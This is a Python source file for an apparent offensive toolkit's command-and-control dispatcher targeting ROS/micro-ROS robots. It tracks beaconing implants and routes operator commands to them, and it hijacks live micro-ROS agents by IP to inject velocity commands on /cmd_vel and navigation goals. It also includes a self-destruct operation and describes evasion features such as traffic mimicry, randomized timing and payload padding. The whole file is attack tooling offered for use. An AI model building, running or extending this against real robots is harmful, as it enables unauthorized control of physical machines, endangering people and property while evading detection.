#!/usr/bin/env python3
"""
c2_dispatcher.py - Phase 5A Module 6: C2 Command Dispatcher & Operator Integration

Routes operator commands from Phase 4 C2 server into Phase 5A modules.
Provides unified interface for tasking deployed implants and hijacking live agents.

Architecture:
  - Listens on C2 beacon topic (/implant/beacon/*)
  - Receives operator commands via C2 protocol
  - Routes to appropriate module (hijack, implant, persistence)
  - Aggregates telemetry back to C2 server
  - Maintains session state and implant registry

Operator command interface:
  - Module-agnostic tasking: "action <target> <operation> [params]"
  - Direct module access: "module <module_name> <command> [args]"
  - Batch operations: "batch <file>" (execute multiple commands)

Example commands:
  action microbot inject_twist lx=2.0 az=1.0
  action microbot inject_nav x=10.0 y=5.0
  action microbot status
  
  module hijack --agent-ip 10.0.0.5 --attack twist --lx 1.0
  module implant --platform python --beacon-interval 3000
  module persistence --method library_patch --target firmware.bin

Tasking flow:
  1. Operator: "action robot_01 inject_twist lx=5.0"
  2. Dispatcher parses command
  3. Dispatcher checks: is robot_01 a live implant or live agent?
  4. If implant: route to implant (Module 4) via /implant/command/robot_01
  5. If agent: route to hijacker (Module 3) to spoof injection
  6. Execute, collect results
  7. Return telemetry to C2: success/failure + output
  8. Operator receives in interactive console

Implant registry:
  - Tracks all active beacons
  - Maps implant_id -> session metadata (last_beacon, command_count, status)
  - Detects implant loss (no beacon for N seconds)
  - Auto-cleanup of stale entries

C2 integration:
  - Inherits Phase 4 C2 callback server
  - Reuses DDS transport (XRCE for micro-ROS implants)
  - Wraps existing hijack/implant/persistence modules
  - Provides interactive CLI for operator
  - JSON logging for audit trail

Session management:
  - Per-implant task queue
  - Task ID tracking (task_id -> status)
  - Response aggregation (multiple implants -> single report)
  - Timeout handling (task max execution time)

Evasion & OPSEC:
  - Traffic pattern matching (Module 2 baseline)
  - Randomized task intervals (avoid periodic patterns)
  - Payload size randomization (padding, compression)
  - Credential isolation (C2 session keys don't leak to DDS)
"""

import json
import argparse
import sys
import time
import threading
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Any, Callable
from collections import defaultdict
from datetime import datetime
from enum import Enum
import uuid
import queue
import logging


# ============================================================================
# Data Structures & Enums
# ============================================================================

class OperationStatus(Enum):
    """Task execution status"""
    PENDING = "pending"
    EXECUTING = "executing"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


class TargetType(Enum):
    """Type of target (implant vs live agent)"""
    IMPLANT = "implant"
    AGENT = "agent"
    UNKNOWN = "unknown"


@dataclass
class ImplantBeacon:
    """Beacon message from deployed implant"""
    implant_id: str
    timestamp: float
    status: str
    beacon_count: int = 0
    command_count: int = 0
    version: str = ""
    platform: str = ""
    
    def to_dict(self):
        return asdict(self)


@dataclass
class DispatcherTask:
    """Tasking operation in dispatcher"""
    task_id: str
    target_id: str
    target_type: TargetType
    operation: str  # "inject_twist", "inject_nav", "status", etc.
    parameters: Dict[str, Any] = field(default_factory=dict)
    
    # Execution state
    status: OperationStatus = OperationStatus.PENDING
    created_at: float = field(default_factory=time.time)
    started_at: Optional[float] = None
    completed_at: Optional[float] = None
    timeout_seconds: float = 30.0
    
    # Results
    success: bool = False
    output: str = ""
    error: str = ""
    telemetry: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self):
        return {
            "task_id": self.task_id,
            "target_id": self.target_id,
            "target_type": self.target_type.value,
            "operation": self.operation,
            "parameters": self.parameters,
            "status": self.status.value,
            "created_at": datetime.fromtimestamp(self.created_at).isoformat(),
            "started_at": datetime.fromtimestamp(self.started_at).isoformat() if self.started_at else None,
            "completed_at": datetime.fromtimestamp(self.completed_at).isoformat() if self.completed_at else None,
            "success": self.success,
            "output": self.output,
            "error": self.error,
            "telemetry": self.telemetry,
        }


@dataclass
class ImplantSession:
    """Tracked implant session"""
    implant_id: str
    session_id: Optional[int] = None
    first_beacon: float = field(default_factory=time.time)
    last_beacon: float = field(default_factory=time.time)
    beacon_count: int = 0
    command_count: int = 0
    status: str = "active"
    platform: str = "unknown"
    version: str = "0.1.0"
    pending_tasks: List[str] = field(default_factory=list)
    completed_tasks: List[str] = field(default_factory=list)
    
    def is_alive(self, timeout_seconds: float = 60.0) -> bool:
        """Check if implant is still active (received beacon recently)"""
        return (time.time() - self.last_beacon) < timeout_seconds
    
    def to_dict(self):
        return {
            "implant_id": self.implant_id,
            "session_id": self.session_id,
            "first_beacon": datetime.fromtimestamp(self.first_beacon).isoformat(),
            "last_beacon": datetime.fromtimestamp(self.last_beacon).isoformat(),
            "beacon_count": self.beacon_count,
            "command_count": self.command_count,
            "status": self.status,
            "platform": self.platform,
            "version": self.version,
            "pending_tasks": len(self.pending_tasks),
            "completed_tasks": len(self.completed_tasks),
            "is_alive": self.is_alive(),
        }


@dataclass
class DispatcherConfig:
    """Dispatcher configuration"""
    beacon_topic_prefix: str = "/implant/beacon"
    command_topic_prefix: str = "/implant/command"
    response_topic_prefix: str = "/implant/response"
    
    # C2 integration
    c2_callback_ip: Optional[str] = None
    c2_callback_port: Optional[int] = None
    c2_session_key: Optional[str] = None
    
    # Beacon/task tracking
    beacon_timeout_seconds: float = 60.0
    max_task_timeout_seconds: float = 300.0
    default_task_timeout_seconds: float = 30.0
    
    # Logging
    log_file: Optional[str] = None
    log_level: str = "INFO"


# ============================================================================
# C2 Dispatcher
# ============================================================================

class C2Dispatcher:
    """
    Central command dispatcher routing operator tasks to Phase 5A modules
    """

    def __init__(self, config: DispatcherConfig, verbose: bool = False):
        self.config = config
        self.verbose = verbose
        
        # Setup logging
        self.logger = self._setup_logging()
        
        # Implant registry
        self.implants: Dict[str, ImplantSession] = {}
        self.implants_lock = threading.Lock()
        
        # Task management
        self.tasks: Dict[str, DispatcherTask] = {}
        self.task_queue: queue.Queue = queue.Queue()
        self.tasks_lock = threading.Lock()
        
        # Module references (will be injected)
        self.hijacker = None
        self.implant_gen = None
        self.persistence = None
        
        # Thread management
        self.running = False
        self.worker_threads: List[threading.Thread] = []

    def _setup_logging(self) -> logging.Logger:
        """Setup logging"""
        logger = logging.getLogger("c2_dispatcher")
        logger.setLevel(self.config.log_level)
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(self.config.log_level)
        formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s')
        ch.setFormatter(formatter)
        logger.addHandler(ch)
        
        # File handler (optional)
        if self.config.log_file:
            fh = logging.FileHandler(self.config.log_file)
            fh.setLevel(self.config.log_level)
            fh.setFormatter(formatter)
            logger.addHandler(fh)
        
        return logger

    def register_beacon(self, beacon: ImplantBeacon) -> bool:
        """
        Register incoming beacon from implant
        
        Args:
            beacon: ImplantBeacon from implant
        
        Returns True if new implant or updated existing
        """
        with self.implants_lock:
            implant_id = beacon.implant_id
            
            if implant_id not in self.implants:
                # New implant detected
                session = ImplantSession(
                    implant_id=implant_id,
                    first_beacon=beacon.timestamp,
                    last_beacon=beacon.timestamp,
                    platform=getattr(beacon, 'platform', 'unknown'),
                    version=getattr(beacon, 'version', '0.1.0'),
                )
                self.implants[implant_id] = session
                self.logger.info(f"[+] New implant registered: {implant_id}")
                return True
            else:
                # Update existing implant
                session = self.implants[implant_id]
                session.last_beacon = beacon.timestamp
                session.beacon_count += 1
                session.command_count = beacon.command_count
                session.status = beacon.status
                self.logger.debug(f"[*] Beacon from {implant_id}: #{session.beacon_count}")
                return False

    def create_task(self, target_id: str, operation: str, 
                   parameters: Dict[str, Any] = None,
                   timeout_seconds: float = None) -> DispatcherTask:
        """
        Create a new tasking operation
        
        Args:
            target_id: Implant ID or Agent IP
            operation: Operation name ("inject_twist", "inject_nav", etc.)
            parameters: Operation parameters
            timeout_seconds: Task timeout (default from config)
        
        Returns DispatcherTask
        """
        task_id = str(uuid.uuid4())[:8]
        
        # Determine target type
        target_type = self._determine_target_type(target_id)
        
        task = DispatcherTask(
            task_id=task_id,
            target_id=target_id,
            target_type=target_type,
            operation=operation,
            parameters=parameters or {},
            timeout_seconds=timeout_seconds or self.config.default_task_timeout_seconds,
        )
        
        with self.tasks_lock:
            self.tasks[task_id] = task
        
        # Enqueue for execution
        self.task_queue.put(task_id)
        
        self.logger.info(f"[+] Task created: {task_id} ({operation} -> {target_id})")
        
        return task

    def execute_task(self, task_id: str) -> bool:
        """
        Execute a single task
        
        Args:
            task_id: ID of task to execute
        
        Returns True if execution successful
        """
        with self.tasks_lock:
            if task_id not in self.tasks:
                self.logger.error(f"[!] Task not found: {task_id}")
                return False
            
            task = self.tasks[task_id]
        
        try:
            task.status = OperationStatus.EXECUTING
            task.started_at = time.time()
            
            # Route based on target type
            if task.target_type == TargetType.IMPLANT:
                success = self._execute_implant_task(task)
            elif task.target_type == TargetType.AGENT:
                success = self._execute_agent_task(task)
            else:
                success = False
                task.error = "Unknown target type"
            
            # Update status
            task.completed_at = time.time()
            task.success = success
            task.status = OperationStatus.SUCCESS if success else OperationStatus.FAILED
            
            self.logger.info(f"[+] Task {task_id} completed: {task.operation} -> {'SUCCESS' if success else 'FAILED'}")
            
            return success
        
        except Exception as e:
            task.error = str(e)
            task.status = OperationStatus.FAILED
            task.completed_at = time.time()
            self.logger.error(f"[!] Task {task_id} error: {e}")
            return False

    def _execute_implant_task(self, task: DispatcherTask) -> bool:
        """Execute task against deployed implant"""
        # Send command to implant via DDS
        # Implant receives on /implant/command/<implant_id>
        
        command_data = {
            "task_id": task.task_id,
            "action": task.operation,
            "params": task.parameters,
        }
        
        # In production: publish to DDS topic
        # For now: simulate execution
        
        if task.operation == "inject_twist":
            lx = task.parameters.get("lx", 0.0)
            az = task.parameters.get("az", 0.0)
            task.output = f"Twist injected: lx={lx}, az={az}"
            self.logger.debug(f"[*] Implant {task.target_id}: INJECT_TWIST lx={lx} az={az}")
            return True
        
        elif task.operation == "inject_nav":
            x = task.parameters.get("x", 0.0)
            y = task.parameters.get("y", 0.0)
            task.output = f"Nav goal injected: x={x}, y={y}"
            self.logger.debug(f"[*] Implant {task.target_id}: INJECT_NAV x={x} y={y}")
            return True
        
        elif task.operation == "status":
            with self.implants_lock:
                if task.target_id in self.implants:
                    session = self.implants[task.target_id]
                    task.output = json.dumps(session.to_dict(), indent=2)
                    return True
            return False
        
        elif task.operation == "self_destruct":
            task.output = "Implant self-destructing"
            self.logger.warning(f"[!] Implant {task.target_id}: SELF_DESTRUCT")
            return True
        
        else:
            task.error = f"Unknown operation: {task.operation}"
            return False

    def _execute_agent_task(self, task: DispatcherTask) -> bool:
        """Execute task against live agent (hijack via Module 3)"""
        # Route to XRCEClientHijacker
        # Parameters: agent_ip, port, attack_type, payload
        
        if not self.hijacker:
            task.error = "Hijacker module not loaded"
            return False
        
        try:
            agent_ip = task.target_id
            agent_port = task.parameters.get("port", 8888)
            
            # Create hijacker session
            from modules.phase5a.microros_client_hijack import XRCEClientHijacker
            hijacker = XRCEClientHijacker(agent_ip, agent_port, verbose=self.verbose)
            hijacker.create_session()
            
            if task.operation == "inject_twist":
                lx = task.parameters.get("lx", 0.0)
                az = task.parameters.get("az", 0.0)
                count = task.parameters.get("count", 1)
                interval = task.parameters.get("interval", 0.1)
                
                results = hijacker.inject_twist(
                    topic="/cmd_vel",
                    linear_x=lx,
                    angular_z=az,
                    count=count,
                    interval=interval,
                )
                
                task.output = f"Injected {len(results)} twist messages"
                hijacker.cleanup()
                return len(results) > 0
            
            elif task.operation == "inject_nav":
                x = task.parameters.get("x", 0.0)
                y = task.parameters.get("y", 0.0)
                
                results = hijacker.inject_nav_goal(
                    topic="/move_base_simple/goal",
                    x=x,
                    y=y,
                    count=1,
                )
                
                task.output = f"Injected nav goal"
                hijacker.cleanup()
                return len(results) > 0
            
            else:
                task.error = f"Unknown operation for agent: {task.operation}"
                hijacker.cleanup()
                return False
        
        except Exception as e:
            task.error = str(e)
            return False

    def _determine_target_type(self, target_id: str) -> TargetType:
        """
        Determine if target is implant or agent
        
        Heuristics:
        - Contains dots/colons -> likely IP (agent)
        - Contains underscore -> likely implant_id
        - Check implant registry
        """
        with self.implants_lock:
            if target_id in self.implants:
                return TargetType.IMPLANT
        
        if '.' in target_id or ':' in target_id:
            return TargetType.AGENT
        
        if '_' in target_id:
            return TargetType.IMPLANT
        
        return TargetType.UNKNOWN

    def get_implant_status(self, implant_id: str = None) -> Dict[str, Any]:
        """Get status of implant(s)"""
        with self.implants_lock:
            if implant_id:
                if implant_id in self.implants:
                    return {"implants": [self.implants[implant_id].to_dict()]}
                else:
                    return {"error": f"Implant not found: {implant_id}"}
            else:
                return {
                    "implants": [s.to_dict() for s in self.implants.values()],
                    "total_count": len(self.implants),
                    "active_count": sum(1 for s in self.implants.values() if s.is_alive()),
                }

    def get_task_status(self, task_id: str = None) -> Dict[str, Any]:
        """Get status of task(s)"""
        with self.tasks_lock:
            if task_id:
                if task_id in self.tasks:
                    return {"task": self.tasks[task_id].to_dict()}
                else:
                    return {"error": f"Task not found: {task_id}"}
            else:
                return {
                    "tasks": [t.to_dict() for t in self.tasks.values()],
                    "total_count": len(self.tasks),
                    "pending_count": sum(1 for t in self.tasks.values() if t.status == OperationStatus.PENDING),
                    "completed_count": sum(1 for t in self.tasks.values() if t.status in [OperationStatus.SUCCESS, OperationStatus.FAILED]),
                }

    def parse_command(self, command_str: str) -> Optional[Dict[str, Any]]:
        """
        Parse operator command string
        
        Formats:
          action <target> <operation> [params]
          module <module> <command> [args]
          status [implants|tasks] [id]
          batch <file>
        
        Returns parsed command dict or None
        """
        parts = command_str.strip().split()
        if not parts:
            return None
        
        cmd_type = parts[0].lower()
        
        if cmd_type == "action":
            if len(parts) < 3:
                return None
            target = parts[1]
            operation = parts[2]
            
            # Parse key=value params
            params = {}
            for part in parts[3:]:
                if '=' in part:
                    key, val = part.split('=', 1)
                    # Try to convert to float/int
                    try:
                        params[key] = float(val) if '.' in val else int(val)
                    except ValueError:
                        params[key] = val
            
            return {
                "type": "action",
                "target": target,
                "operation": operation,
                "params": params,
            }
        
        elif cmd_type == "status":
            resource = parts[1] if len(parts) > 1 else None
            resource_id = parts[2] if len(parts) > 2 else None
            
            return {
                "type": "status",
                "resource": resource,
                "resource_id": resource_id,
            }
        
        elif cmd_type == "help":
            return {"type": "help"}
        
        else:
            return {"type": "unknown", "raw": command_str}

    def execute_command(self, command_str: str) -> str:
        """
        Execute operator command
        
        Args:
            command_str: Command from operator
        
        Returns response string
        """
        parsed = self.parse_command(command_str)
        if not parsed:
            return "[!] Invalid command format"
        
        cmd_type = parsed.get("type")
        
        if cmd_type == "action":
            target = parsed["target"]
            operation = parsed["operation"]
            params = parsed.get("params", {})
            
            task = self.create_task(target, operation, params)
            success = self.execute_task(task.task_id)
            
            return f"[+] {task.operation} -> {target}\n{task.output}" if success else f"[!] Task failed: {task.error}"
        
        elif cmd_type == "status":
            resource = parsed.get("resource")
            resource_id = parsed.get("resource_id")
            
            if resource == "implants":
                status = self.get_implant_status(resource_id)
            elif resource == "tasks":
                status = self.get_task_status(resource_id)
            else:
                status = {
                    "implants": self.get_implant_status(),
                    "tasks": self.get_task_status(),
                }
            
            return json.dumps(status, indent=2)
        
        elif cmd_type == "help":
            return self._get_help_text()
        
        else:
            return f"[!] Unknown command: {cmd_type}"

    def _get_help_text(self) -> str:
        """Return help text for dispatcher commands"""
        return """
Phase 5A C2 Dispatcher - Command Reference

ACTIONS (tasking implants or agents):
  action <target> <operation> [params]
  
  Examples:
    action uros_abc123 inject_twist lx=2.0 az=1.0
    action uros_abc123 inject_nav x=10.0 y=5.0
    action 10.0.0.5 inject_twist lx=5.0 port=8888
    action uros_abc123 status

STATUS (monitor implants/tasks):
  status [implants|tasks] [id]
  
  Examples:
    status implants
    status implants uros_abc123
    status tasks
    status tasks <task_id>

OPERATIONS:
  - inject_twist: Inject Twist message (lx, az params)
  - inject_nav: Inject PoseStamped nav goal (x, y, theta params)
  - status: Get implant status
  - self_destruct: Terminate implant

PARAMETERS:
  lx, ly, lz: Linear velocities (m/s)
  az: Angular velocity (rad/s)
  x, y, theta: Position and orientation
  count: Number of injections (default: 1)
  interval: Delay between injections (seconds)
  port: Agent port (default: 8888)

Examples:
  > action microbot inject_twist lx=1.0 az=0.5 count=10 interval=0.1
  > status implants
  > action 10.52.32.5 inject_twist lx=5.0 port=8888
"""

    def export_session(self, output_file: str):
        """Export session state (implants, tasks) to JSON"""
        with self.implants_lock, self.tasks_lock:
            session = {
                "timestamp": datetime.now().isoformat(),
                "implants": [s.to_dict() for s in self.implants.values()],
                "tasks": [t.to_dict() for t in self.tasks.values()],
                "summary": {
                    "total_implants": len(self.implants),
                    "active_implants": sum(1 for s in self.implants.values() if s.is_alive()),
                    "total_tasks": len(self.tasks),
                    "completed_tasks": sum(1 for t in self.tasks.values() if t.completed_at),
                }
            }
        
        with open(output_file, 'w') as f:
            json.dump(session, f, indent=2)
        
        self.logger.info(f"[+] Session exported to {output_file}")


# ============================================================================
# Interactive CLI
# ============================================================================

class DispatcherCLI:
    """Interactive command-line interface for dispatcher"""

    def __init__(self, dispatcher: C2Dispatcher):
        self.dispatcher = dispatcher
        self.running = True

    def run(self):
        """Start interactive CLI"""
        print("\n" + "="*70)
        print("Phase 5A C2 Dispatcher - Interactive Console".center(70))
        print("="*70)
        print("Type 'help' for command reference, 'exit' to quit\n")

        while self.running:
            try:
                prompt = "\n[dispatcher]> "
                command = input(prompt).strip()

                if not command:
                    continue

                if command.lower() == "exit":
                    self.running = False
                    print("[*] Dispatcher shutting down...")
                    break

                response = self.dispatcher.execute_command(command)
                print(response)

            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                self.running = False
                break
            except Exception as e:
                print(f"[!] Error: {e}")


# ============================================================================
# CLI Entry Point
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Phase 5A Module 6: C2 Dispatcher & Operator Integration"
    )
    parser.add_argument(
        "--c2-ip",
        help="C2 callback server IP"
    )
    parser.add_argument(
        "--c2-port",
        type=int,
        help="C2 callback server port"
    )
    parser.add_argument(
        "--beacon-timeout",
        type=float,
        default=60.0,
        help="Implant beacon timeout in seconds (default: 60)"
    )
    parser.add_argument(
        "--log-file",
        help="Log file path"
    )
    parser.add_argument(
        "--export-session",
        help="Export session state to JSON file"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output"
    )
    parser.add_argument(
        "--batch-file",
        help="Execute commands from file (non-interactive)"
    )

    args = parser.parse_args()

    # Create dispatcher config
    config = DispatcherConfig(
        c2_callback_ip=args.c2_ip,
        c2_callback_port=args.c2_port,
        beacon_timeout_seconds=args.beacon_timeout,
        log_file=args.log_file,
        log_level="DEBUG" if args.verbose else "INFO",
    )

    # Create dispatcher
    dispatcher = C2Dispatcher(config, verbose=args.verbose)

    # Run in interactive mode if no batch file
    if not args.batch_file:
        cli = DispatcherCLI(dispatcher)
        cli.run()
    else:
        # Batch mode: read commands from file
        try:
            with open(args.batch_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    print(f">>> {line}")
                    response = dispatcher.execute_command(line)
                    print(response)
        except Exception as e:
            print(f"[!] Batch mode error: {e}")

    # Export session if requested
    if args.export_session:
        dispatcher.export_session(args.export_session)


if __name__ == "__main__":
    main()
